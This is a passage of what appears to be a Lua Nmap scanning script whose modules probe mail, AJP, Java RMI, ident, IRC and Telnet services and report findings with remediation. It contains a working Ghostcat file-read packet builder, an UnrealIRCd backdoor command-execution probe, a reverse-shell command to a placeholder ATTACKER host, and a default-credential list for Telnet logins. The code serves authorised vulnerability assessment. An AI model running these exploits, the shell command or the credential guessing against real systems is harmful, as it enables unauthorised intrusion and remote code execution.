      "SIP REGISTER responses differ between valid and invalid usernames. "
      .. "401/407 responses indicate the user exists and requires authentication; "
      .. "this enables targeted credential attacks and toll fraud.",
      {
        valid_users = table.concat(valid_users, ", "),
        remediation = "Configure SIP server to return 403 for all unknown users "
                      .. "(identical response regardless of user existence)",
      },
      0.90, 0.50
    )
  end
end)


-- ===========================================================================
-- AJP MODULE  (port 8009/tcp)
-- ===========================================================================
-- Apache JServ Protocol (AJP) connects web servers (Apache httpd) to
-- Tomcat backends. CVE-2020-1938 "Ghostcat" allows unauthenticated file
-- read from the web application and potentially remote code execution.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] AJP13 banner: send a minimal AJP FORWARD_REQUEST and check
--         if the server responds (confirms AJP is accessible)
--    [P2] Ghostcat probe (CVE-2020-1938): attempt to read /WEB-INF/web.xml
--         via an AJP file include request — if successful, the server is
--         vulnerable and returns the file content
--
--  Scoring:
--    Ghostcat file read succeeds     → confidence 0.99, impact 0.90 → CRITICAL
--    AJP port exposed (unauthenticated) → confidence 0.95, impact 0.65 → HIGH
-- ===========================================================================

--- Build an AJP13 FORWARD_REQUEST to include a local file (Ghostcat).
-- This is the exact request pattern used by CVE-2020-1938 exploits.
-- We request /WEB-INF/web.xml via the requiredSecret=null path.
local function ajp_build_ghostcat_request(host_ip)
  -- AJP13 packet structure:
  -- 0x12 0x34 = magic
  -- length(2 BE)
  -- type byte (0x02 = FORWARD_REQUEST)
  -- then encoded attributes

  -- Helper: AJP string = length(2 BE) + bytes + 0xFF terminator if non-null
  -- For null string: 0xFF 0xFF
  local function ajp_string(s)
    if not s then return "\xFF\xFF" end
    local len = #s
    return string.char(math.floor(len/256), len%256) .. s .. "\x00"
  end

  local method    = "\x02"           -- GET method code
  local protocol  = ajp_string("HTTP/1.1")
  local req_uri   = ajp_string("/index.jsp")
  local remote_addr = ajp_string("127.0.0.1")
  local remote_host = ajp_string("localhost")
  local server_name = ajp_string(host_ip)
  local server_port = "\x1F\x90"    -- 8080 in big-endian
  local is_ssl    = "\x00"           -- false

  -- Number of headers: 1 (Host)
  local num_headers = "\x00\x01"
  local host_header = "\xA0\x0B" .. ajp_string(host_ip)  -- 0xA00B = Host

  -- Attributes: req_attribute for Ghostcat include
  -- attribute_name = "javax.servlet.include.request_uri"
  -- attribute_value = the file to include
  local ghostcat_attr =
    "\x0A" ..   -- attribute type = req_attribute
    ajp_string("javax.servlet.include.request_uri") ..
    ajp_string("/") ..
    "\x0A" ..
    ajp_string("javax.servlet.include.path_info") ..
    ajp_string("/WEB-INF/web.xml") ..
    "\x0A" ..
    ajp_string("javax.servlet.include.servlet_path") ..
    ajp_string("/") ..
    "\xFF"      -- attribute terminator

  local payload = method .. protocol .. req_uri .. remote_addr
    .. remote_host .. server_name .. server_port .. is_ssl
    .. num_headers .. host_header .. ghostcat_attr

  local pkt_len = #payload + 1   -- +1 for type byte
  return "\x12\x34"
    .. string.char(math.floor(pkt_len/256), pkt_len%256)
    .. "\x02"   -- FORWARD_REQUEST
    .. payload
end

register_module("ajp", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number   -- 8009
  local timeout = ctx.config.timeout

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "ajp", "Cannot connect: " .. err)
    return
  end

  -- Flag: AJP port is accessible at all = HIGH finding
  -- AJP should NEVER be exposed to untrusted networks
  ctx:add_finding(
    "AJP connector (port 8009) is accessible from the network (HIGH)",
    "The Apache JServ Protocol (AJP) connector is reachable without any "
    .. "network-level restriction. AJP is an internal protocol designed for "
    .. "communication between Apache httpd and Tomcat on the same host or "
    .. "trusted internal network. External exposure introduces severe risk "
    .. "including CVE-2020-1938 (Ghostcat) file read/inclusion.",
    {
      port        = tostring(port_num),
      remediation = "Firewall port 8009 immediately; if AJP is not needed, "
                    .. "disable it in server.xml: comment out the AJP Connector element; "
                    .. "if required, add requiredSecret attribute (Tomcat 9.0.31+)",
    },
    0.95, 0.65
  )

  -- Ghostcat probe
  sock_send(sd, ajp_build_ghostcat_request(host_ip))

  local resp = ""
  for _ = 1, 16 do
    local st, chunk = sd:receive()
    if not st then break end
    resp = resp .. chunk
    if #resp >= 4096 then break end
  end
  sock_close(sd)

  -- If response contains web.xml content markers → Ghostcat confirmed
  if resp:find("web%-app", 1, true) or resp:find("servlet", 1, true)
     or resp:find("<%?xml", 1, true) or resp:find("WEB%-INF", 1, true) then
    ctx:add_finding(
      "Ghostcat CVE-2020-1938: /WEB-INF/web.xml read successfully (CRITICAL)",
      "The AJP connector responded with content from /WEB-INF/web.xml via "
      .. "a file include request. Ghostcat (CVE-2020-1938) allows any file "
      .. "within the web application to be read, and if file upload is "
      .. "available, can lead to Remote Code Execution.",
      {
        cve           = "CVE-2020-1938",
        cvss          = "9.8 CRITICAL",
        response_size = tostring(#resp) .. " bytes",
        content_hint  = resp:sub(1, 200),
        remediation   = "Upgrade Tomcat to 9.0.31+, 8.5.51+, or 7.0.100+; "
                        .. "disable AJP connector if not required",
      },
      0.99, 0.90
    )
    log_warn(ctx, "ajp", "GHOSTCAT CVE-2020-1938 CONFIRMED")
  end
end)


-- ===========================================================================
-- POP3 MODULE  (port 110/tcp)
-- ===========================================================================
register_module("pop3", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then log_error(ctx, "pop3", "Cannot connect: " .. err); return end

  -- POP3 sends +OK greeting immediately
  local banner, berr = sock_readline(sd)
  if not banner then
    log_warn(ctx, "pop3", "No banner: " .. (berr or "")); sock_close(sd); return
  end
  banner = trim(banner)
  log_info(ctx, "pop3", "Banner: " .. banner)

  ctx:add_finding(
    "POP3 service banner disclosed",
    "The POP3 server greeting reveals software and version. "
    .. "POP3 credentials are transmitted in plaintext unless STARTTLS is used.",
    { banner = banner },
    0.95, 0.30
  )

  -- CAPA command to enumerate capabilities
  sock_send(sd, "CAPA\r\n")
  local capa_resp = ""
  for _ = 1, 20 do
    local line, _ = sock_readline(sd)
    if not line then break end
    capa_resp = capa_resp .. line .. "\n"
    if trim(line) == "." then break end
  end

  local has_starttls = capa_resp:upper():find("STLS", 1, true) ~= nil
  if not has_starttls then
    ctx:add_finding(
      "POP3 does not advertise STARTTLS — credentials sent in cleartext",
      "The CAPA response does not include STLS. All POP3 authentication "
      .. "(USER/PASS commands) is transmitted in plaintext.",
      {
        capa_response = capa_resp:sub(1, 300),
        remediation   = "Enable STARTTLS in mail server config; "
                        .. "prefer POP3S (port 995) over plain POP3",
      },
      0.95, 0.60
    )
  end

  sock_send(sd, "QUIT\r\n")
  sock_close(sd)
end)


-- ===========================================================================
-- IMAP MODULE  (port 143/tcp)
-- ===========================================================================
register_module("imap", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then log_error(ctx, "imap", "Cannot connect: " .. err); return end

  local banner, berr = sock_readline(sd)
  if not banner then
    log_warn(ctx, "imap", "No banner: " .. (berr or "")); sock_close(sd); return
  end
  banner = trim(banner)
  log_info(ctx, "imap", "Banner: " .. banner)

  -- Extract software from banner: "* OK Dovecot ready."
  local software = banner:match("%*%s+OK%s+([%w]+)") or "unknown"

  ctx:add_finding(
    "IMAP service banner disclosed — software: " .. software,
    "The IMAP server greeting reveals software identity. "
    .. "IMAP credentials are exposed unless STARTTLS is negotiated.",
    { banner = banner, software = software },
    0.95, 0.30
  )

  -- CAPABILITY command
  sock_send(sd, "A001 CAPABILITY\r\n")
  local cap_resp = ""
  for _ = 1, 10 do
    local line, _ = sock_readline(sd)
    if not line then break end
    cap_resp = cap_resp .. line .. "\n"
    if line:match("^A001") then break end   -- tagged response = done
  end

  local has_starttls  = cap_resp:upper():find("STARTTLS", 1, true) ~= nil
  local has_logindis  = cap_resp:upper():find("LOGINDISABLED", 1, true) ~= nil
  local auth_mechs    = cap_resp:match("AUTH=([%w%s]+)") or ""

  if not has_starttls then
    ctx:add_finding(
      "IMAP does not advertise STARTTLS — credentials sent in cleartext",
      "The server did not include STARTTLS in its CAPABILITY response. "
      .. "Username and password are transmitted unencrypted.",
      {
        capabilities = cap_resp:sub(1, 300),
        remediation  = "Enable STARTTLS in IMAP server configuration; "
                       .. "prefer IMAPS (port 993); set disable_plaintext_auth = yes (Dovecot)",
      },
      0.95, 0.60
    )
  end

  if auth_mechs:upper():find("PLAIN", 1, true) or auth_mechs:upper():find("LOGIN", 1, true) then
    ctx:add_finding(
      "IMAP advertises plaintext AUTH mechanisms (PLAIN/LOGIN)",
      "AUTH=PLAIN or AUTH=LOGIN allows credentials to be sent in base64-encoded "
      .. "(effectively plaintext) form. Without TLS this is trivially interceptable.",
      {
        auth_mechanisms = auth_mechs,
        remediation     = "Disable AUTH PLAIN/LOGIN unless TLS is in use; "
                          .. "enforce STARTTLS before allowing authentication",
      },
      0.90, 0.55
    )
  end

  sock_send(sd, "A002 LOGOUT\r\n")
  sock_close(sd)
end)


-- ===========================================================================
-- JAVA RMI MODULE  (port 1100/tcp)
-- ===========================================================================
-- Java RMI (Remote Method Invocation) Registry exposes remote objects by
-- name. Unauthenticated registry access allows listing and potentially
-- invoking remote methods, and is a vector for deserialization attacks.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] RMI handshake: send StreamProtocol header and read PROTOCOL_ACK
--         to confirm RMI is active
--    [P2] Registry list: send RemoteCall for list() operation on the
--         default RMI registry — returns bound object names
--
--  Scoring:
--    Registry names exposed          → confidence 0.95, impact 0.65 → HIGH
--    RMI accessible (any response)   → confidence 0.90, impact 0.45 → MEDIUM
-- ===========================================================================

--- Build an RMI StreamProtocol header.
-- All RMI connections start with this magic sequence.
local function rmi_build_handshake()
  -- StreamProtocol: 0x4A 0x52 0x4D 0x49 (JRMI) + version(2) + StreamProtocol(1)
  -- then: SingleOpProtocol or StreamProtocol continuation
  return "\x4A\x52\x4D\x49"  -- JRMI magic
    .. "\x00\x02"             -- version 2
    .. "\x4B"                 -- StreamProtocol
end

--- Build an RMI call to list() on the registry (ObjID 0).
-- This is a serialized RemoteCall for the list() method.
-- Uses the pre-computed serialized form of the call.
local function rmi_build_list_call()
  -- This is the canonical serialized form of a registry list() call.
  -- The call ID for list() in sun.rmi.registry.RegistryImpl_Stub is 2.
  -- Method hash for list(): 0x2DDE99200D4F7BAD
  return "\x50"  -- Call message type
    .. "\xAC\xED"                -- Java serialization magic
    .. "\x00\x05"                -- serialization version 5
    .. "\x77\x22"                -- TC_BLOCKDATA, 34 bytes
    -- ObjID for registry (0): endpoint + ObjNum
    .. "\x00\x00\x00\x00\x00\x00\x00\x00"  -- ObjNum = 0
    .. "\x00\x00\x00\x00"                  -- UID unique = 0
    .. "\x00\x00\x00\x00\x00\x00\x00\x00"  -- UID time = 0
    .. "\x00\x00"                           -- UID count = 0
    -- Operation number for list() = 1
    .. "\x00\x00\x00\x01"
    -- Method hash for list(): 0x2DDE99200D4F7BAD
    .. "\x2D\xDE\x99\x20\x0D\x4F\x7B\xAD"
end

register_module("java_rmi", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then log_error(ctx, "java_rmi", "Cannot connect: " .. err); return end

  -- Send RMI handshake
  sock_send(sd, rmi_build_handshake())

  local ack = ""
  for _ = 1, 4 do
    local st, ch = sd:receive()
    if not st then break end
    ack = ack .. ch
    if #ack >= 8 then break end
  end

  -- Check for PROTOCOL_ACK: 0x4E (ProtocolAck)
  if not ack:find("\x4E", 1, true) then
    log_info(ctx, "java_rmi", "No RMI PROTOCOL_ACK received")
    sock_close(sd); return
  end

  ctx:add_finding(
    "Java RMI registry is accessible without authentication",
    "The Java RMI registry responded to a protocol handshake. "
    .. "Unauthenticated RMI registry access is a vector for Java "
    .. "deserialization attacks (ysoserial, CVE-2017-3241) and allows "
    .. "remote object enumeration and potentially method invocation.",
    {
      port        = tostring(port_num),
      remediation = "Firewall RMI ports; use SSL/TLS for RMI (javax.rmi.ssl); "
                    .. "implement Java SecurityManager; migrate from RMI to REST/gRPC",
    },
    0.90, 0.45
  )

  -- Send list() call
  sock_send(sd, rmi_build_list_call())

  local list_resp = ""
  for _ = 1, 8 do
    local st, ch = sd:receive()
    if not st then break end
    list_resp = list_resp .. ch
    if #list_resp >= 2048 then break end
  end
  sock_close(sd)

  -- Extract object names from serialized response
  -- Java strings in serialization: 0x74 (TC_STRING) + length(2) + bytes
  local bound_names = {}
  local pos = 1
  while pos < #list_resp - 2 do
    if list_resp:byte(pos) == 0x74 then   -- TC_STRING
      local slen = list_resp:byte(pos+1) * 256 + list_resp:byte(pos+2)
      if slen > 0 and slen < 256 and pos + 2 + slen <= #list_resp then
        local name = list_resp:sub(pos+3, pos+2+slen)
        if name:match("^[%w%.%-_/]+$") then
          table.insert(bound_names, name)
        end
        pos = pos + 3 + slen
      else
        pos = pos + 1
      end
    else
      pos = pos + 1
    end
  end

  if #bound_names > 0 then
    ctx:add_finding(
      string.format("Java RMI registry exposes %d bound object(s)", #bound_names),
      "The RMI registry list() call returned bound object names. "
      .. "These represent remotely accessible Java objects. Attackers can "
      .. "look up these objects and probe them for deserialization gadget chains.",
      {
        bound_objects = table.concat(bound_names, ", "),
        remediation   = "Remove unused RMI bindings; implement authentication "
                        .. "via JNDI access controls; use SSL for RMI transport",
      },
      0.95, 0.65
    )
  end
end)


-- ===========================================================================
-- IDENT MODULE  (port 113/tcp)
-- ===========================================================================
-- The ident protocol maps TCP connections to local usernames.
-- It reveals which system accounts are running network services.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] Query for the username associated with the connection to this port
--         by sending a port query: "<server_port>, <our_port>\r\n"
--         A response reveals the username of the service owner
--
--  Scoring:
--    Username disclosed              → confidence 0.90, impact 0.35 → MEDIUM
--    Ident active (any response)     → confidence 0.90, impact 0.20 → LOW
-- ===========================================================================

register_module("ident", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number   -- 113
  local timeout = ctx.config.timeout

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then log_error(ctx, "ident", "Cannot connect: " .. err); return end

  -- Query: "server_port, client_port\r\n"
  -- We query port 22 (SSH) as it is almost always running if ident is
  local query = "22, " .. tostring(math.random(1024, 65535)) .. "\r\n"
  sock_send(sd, query)

  local resp, _ = sock_readline(sd)
  sock_close(sd)

  if not resp then
    log_info(ctx, "ident", "No ident response")
    return
  end
  resp = trim(resp)

  ctx:add_finding(
    "ident service active on port 113",
    "The ident (auth) protocol is running. This service can reveal the "
    .. "username of processes owning network connections, aiding attackers "
    .. "in mapping service accounts and user enumeration.",
    { response = resp },
    0.90, 0.20
  )

  -- Check for an actual username in the response
  -- ident response format: "server_port, client_port : USERID : OS : username"
  local username = resp:match("USERID%s*:%s*[^:]+:%s*(.+)$")
  if username then
    username = trim(username)
    ctx:add_finding(
      "ident discloses service username: " .. username,
      string.format(
        "The ident service revealed that the queried port (22/SSH) is owned "
        .. "by user '%s'. This username can be used in brute-force attacks, "
        .. "social engineering, and to understand service privilege levels.",
        username
      ),
      {
        disclosed_username = username,
        queried_port       = "22 (SSH)",
        remediation        = "Disable ident service: systemctl disable --now inetd; "
                             .. "firewall port 113 from untrusted networks",
      },
      0.90, 0.35
    )
  end
end)



end  -- scope block


do  -- scope block

-- ===========================================================================
-- IRC MODULE  (port 6667/tcp)
-- ===========================================================================
-- UnrealIRCd 3.2.8.1 (CVE-2010-2075) contains a backdoor in its source
-- distribution. Sending "AB;" followed by a system command executes that
-- command on the server as the IRC daemon's user.
--
-- Checks:
--  AGG 0: Banner grab + version detection
--  AGG 1: CVE-2010-2075 backdoor probe
-- ===========================================================================
register_module("irc", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout
  local agg     = ctx.config.aggression

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "irc", "Cannot connect: " .. err); return
  end

  -- IRC server sends NOTICE/001 welcome messages immediately
  local banner = ""
  for _ = 1, 10 do
    local st, chunk = sd:receive()
    if not st then break end
    banner = banner .. chunk
    if #banner >= 512 then break end
  end
  sock_close(sd)

  -- Extract server version from IRC banner lines
  -- Format: ":server 004 * serverhost version ..."
  local irc_version = banner:match("Unreal([%d%.]+)") or
                      banner:match("UnrealIRCd%-([%d%.]+)") or
                      banner:match("VERSION.-(UnrealIRCd[%s%-][%d%.]+)") or
                      "unknown"

  local server_host = banner:match(":([%w%.%-]+)%s+001") or host_ip

  log_info(ctx, "irc", "IRC banner version: " .. irc_version)

  ctx:add_finding(
    "IRC service active — " .. (irc_version ~= "unknown" and ("UnrealIRCd " .. irc_version) or "version unknown"),
    "An IRC server is running on this host. IRC servers are rarely intentional "
    .. "on production systems and often indicate a legacy deployment or a "
    .. "compromised host used as a botnet C2. "
    .. "Server: " .. server_host .. "  Version: " .. irc_version,
    {
      server_host = server_host,
      version     = irc_version,
      port        = tostring(port_num),
    },
    0.90, 0.35
  )

  -- Check for UnrealIRCd 3.2.8.1 specifically
  local is_vulnerable_version = banner:find("3.2.8.1", 1, true) or
                                  banner:find("Unreal3.2.8.1", 1, true)

  if is_vulnerable_version then
    ctx:add_finding(
      "UnrealIRCd 3.2.8.1 detected — CVE-2010-2075 backdoor likely present",
      "UnrealIRCd version 3.2.8.1 was distributed with a backdoor from November "
      .. "2009 to June 2010. The backdoor allows unauthenticated Remote Code Execution "
      .. "by sending 'AB;' followed by any system command. This was a supply-chain "
      .. "attack on the official source tarball.",
      {
        cve         = "CVE-2010-2075",
        version     = "3.2.8.1",
        remediation = "Replace with a clean UnrealIRCd version; "
                      .. "verify SHA1/MD5 hash of any installed IRC daemon",
      },
      0.95, 0.85
    )
  end

  if agg < 1 then return end

  -- ---- CVE-2010-2075 Backdoor probe ------------------------------------
  -- The backdoor trigger: send "AB;" + command
  -- We use a safe probe: "id" command - if we get uid=... back, backdoor confirmed
  local probe_sd, perr = tcp_connect(host_ip, port_num, timeout)
  if not probe_sd then
    log_warn(ctx, "irc", "Backdoor probe connect failed: " .. (perr or ""))
    return
  end

  -- Drain the welcome banner
  local welcome = ""
  for _ = 1, 6 do
    local st, ch = probe_sd:receive()
    if not st then break end
    welcome = welcome .. ch
    if #welcome >= 256 then break end
  end

  -- Send the backdoor trigger
  -- "AB;" + shell command + newline
  local probe_cmd = "AB;echo RKO_PROBE_$(id)\n"
  sock_send(probe_sd, probe_cmd)

  -- Read response - if backdoor active, we'll see the id output
  local probe_resp = ""
  for _ = 1, 8 do
    local st, ch = probe_sd:receive()
    if not st then break end
    probe_resp = probe_resp .. ch
    if probe_resp:find("RKO_PROBE_", 1, true) or #probe_resp >= 512 then break end
  end
  sock_close(probe_sd)

  if probe_resp:find("RKO_PROBE_", 1, true) or
     probe_resp:find("uid=", 1, true) or
     probe_resp:find("root", 1, true) then
    -- Extract uid string if present
    local uid_str = probe_resp:match("uid=%S+") or "command executed"
    ctx:add_finding(
      "UnrealIRCd CVE-2010-2075 BACKDOOR CONFIRMED — Remote Code Execution",
      "The AB; backdoor in UnrealIRCd 3.2.8.1 is active. Command execution "
      .. "was confirmed via probe response. An attacker can execute arbitrary "
      .. "OS commands as the IRC daemon user (often root or ircd). "
      .. "Response: " .. uid_str,
      {
        cve           = "CVE-2010-2075",
        response      = uid_str,
        attack_cmd    = 'echo "AB;bash -i >& /dev/tcp/ATTACKER/4444 0>&1" | nc ' .. host_ip .. " " .. port_num,
        metasploit    = "exploit/unix/irc/unreal_ircd_3281_backdoor",
        remediation   = "Remove UnrealIRCd 3.2.8.1 immediately; firewall port 6667",
      },
      0.99, 0.95
    )
    log_warn(ctx, "irc", "UnrealIRCd BACKDOOR CONFIRMED — RCE active!")
  else
    log_info(ctx, "irc", "IRC backdoor probe: no command execution detected")
  end
end)

end  -- scope block

do  -- scope block

-- ===========================================================================
-- TELNET MODULE  (port 23/tcp)
-- ===========================================================================
-- Telnet transmits everything in plaintext. It is almost always a sign of
-- a legacy or deliberately vulnerable system. In CTF environments Telnet
-- often has default credentials that give immediate shell access.
--
-- Checks:
--  AGG 0: Banner grab + plaintext protocol finding
--  AGG 1: Default credential test (msfadmin, admin, root, user)
-- ===========================================================================
register_module("telnet", function(ctx)
  local host_ip = ctx.target_ip
  local port_num= ctx.port_number
  local timeout = ctx.config.timeout
  local agg     = ctx.config.aggression

  local sd, err = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "telnet", "Cannot connect: " .. err); return
  end

  -- Telnet may send IAC option negotiations before the login banner
  -- Read up to 512 bytes to get past the IAC noise to the banner text
  local raw_banner = ""
  for _ = 1, 8 do
    local st, chunk = sd:receive()
    if not st then break end
    raw_banner = raw_banner .. chunk
    if #raw_banner >= 256 then break end
  end
  sock_close(sd)

  -- Strip IAC sequences (0xFF followed by 2 bytes) and control chars
  local banner = raw_banner:gsub("ÿ..", ""):gsub("[%c]", " "):match("^%s*(.-)%s*$") or ""

  -- Always flag telnet as HIGH - it's cleartext by definition
  ctx:add_finding(
    "Telnet service active — all data transmitted in CLEARTEXT",
    "Telnet transmits usernames, passwords, and all session data in plaintext. "
    .. "Any network observer can capture credentials and session content. "
    .. "Telnet should be replaced with SSH in all modern environments. "
    .. (banner ~= "" and ("Banner: " .. banner:sub(1,120)) or "No banner captured."),
    {
      banner      = banner:sub(1, 200),
      remediation = "Disable telnet: systemctl disable telnet; "
                    .. "deploy SSH instead; firewall port 23",
    },
    0.95, 0.75
  )

  if agg < 1 then return end

  -- Default credential pairs common in CTF + legacy systems
  local telnet_creds = {
    { "msfadmin", "msfadmin", "Metasploitable default" },
    { "admin",    "admin",    "Generic admin default"  },
    { "root",     "root",     "Root with same password" },
    { "root",     "",         "Root with no password"  },
    { "user",     "user",     "Generic user default"   },
    { "guest",    "guest",    "Guest account"          },
    { "admin",    "password", "Admin with 'password'"  },
    { "admin",    "1234",     "Admin with '1234'"      },
  }

  -- Telnet credential testing: connect, wait for login: prompt, send user,
  -- wait for password: prompt, send pass, check for shell prompt ($, #, >, %)
  for _, cred in ipairs(telnet_creds) do
    local csd, cerr = tcp_connect(host_ip, port_num, timeout)
    if not csd then break end

    -- Drain IAC negotiation and wait for login prompt
    local login_banner = ""
    for _ = 1, 10 do
      local st, ch = csd:receive()
      if not st then break end
      login_banner = login_banner .. ch
      -- Look for login: or Username: prompt
      local clean = login_banner:gsub("ÿ..", "")
      if clean:lower():find("login:") or clean:lower():find("username:") then
        break
      end
      if #login_banner > 512 then break end
    end

    -- Send username
    sock_send(csd, cred[1] .. "\r\n")

    -- Wait for password prompt
    local pass_prompt = ""
    for _ = 1, 8 do
      local st, ch = csd:receive()
      if not st then break end
      pass_prompt = pass_prompt .. ch
      if pass_prompt:lower():find("password:") or pass_prompt:lower():find("passwd:") then break end
      if #pass_prompt > 256 then break end
    end

    -- Send password
    sock_send(csd, cred[2] .. "\r\n")

    -- Read response - look for shell prompt indicators
    local shell_resp = ""
    for _ = 1, 8 do
      local st, ch = csd:receive()
      if not st then break end
      shell_resp = shell_resp .. ch
      if #shell_resp > 512 then break end
    end
    sock_close(csd)

    -- Check for shell prompt: $, #, %, > after stripping control chars
    local clean_resp = shell_resp:gsub("ÿ..", ""):gsub("[%z- 8	-]", "")
    local has_shell = clean_resp:match("[#$%%>]%s*$") or
                      clean_resp:lower():find("last login") or
                      clean_resp:lower():find("welcome")
    local has_error = clean_resp:lower():find("incorrect") or
                      clean_resp:lower():find("invalid") or
                      clean_resp:lower():find("failed") or
                      clean_resp:lower():find("denied")

    if has_shell and not has_error then
      ctx:add_finding(
        string.format("Telnet default credentials accepted: %s / %s (CRITICAL — SHELL ACCESS)",
          cred[1], ctx.config.redact and "[REDACTED]" or cred[2]),
        string.format(
          "Telnet accepted login with '%s'/'%s' (%s). "
          .. "Full interactive shell access over plaintext Telnet. "
          .. "An attacker gains complete system access.",
          cred[1], cred[2], cred[3]
        ),
        {
          username    = cred[1],
          password    = ctx.config.redact and "[REDACTED]" or cred[2],
          note        = cred[3],
          remediation = "Change default credentials immediately; "
                        .. "disable Telnet; deploy SSH with key authentication",
        },
        0.99, 0.92
      )
      log_warn(ctx, "telnet", "Shell access via: " .. cred[1] .. "/" .. cred[2])
      break
    end
  end
end)

end  -- scope block


-- ── ACTION: NSE entry point (always last) ──────────────────────────────────

action = function(host, port)
  -- 1. Initialise context
  local ctx = init_context(host, port)

  -- 2. Dispatch to the appropriate module (may register findings)
  dispatch_to_modules(ctx)

  -- 3. Record findings to global registry for attack path synthesis (C8)
  for _, finding in ipairs(ctx.findings) do
    registry_record(host.ip, finding)
  end

  -- 4. Build per-port output
  local output = build_output(ctx)

  -- 5. Try to append attack path summary (appears on the port with most findings)
  -- Only generate summary if we have meaningful findings and enough context
  local all_host_findings = registry_get(host.ip)
  local port_set = {}
  for _, f in ipairs(all_host_findings) do port_set[f.port or 0] = true end
  local port_count = 0
  for _ in pairs(port_set) do port_count = port_count + 1 end

  -- Generate summary on the port with the most findings (heuristic: >=5 ports scanned)
  if port_count >= 4 and #ctx.findings >= 2 then
    local summary = build_attack_path_summary(host.ip, port.number)
    if summary then
      if output then
        output = output .. "\n\n" .. summary
      else
        output = summary
      end
      -- Clear registry for this host so summary only appears once
      local reg = nmap.registry[REKO_REGISTRY_KEY] or {}
      reg[host.ip] = nil
      nmap.registry[REKO_REGISTRY_KEY] = reg
    end
  end

  return output
end
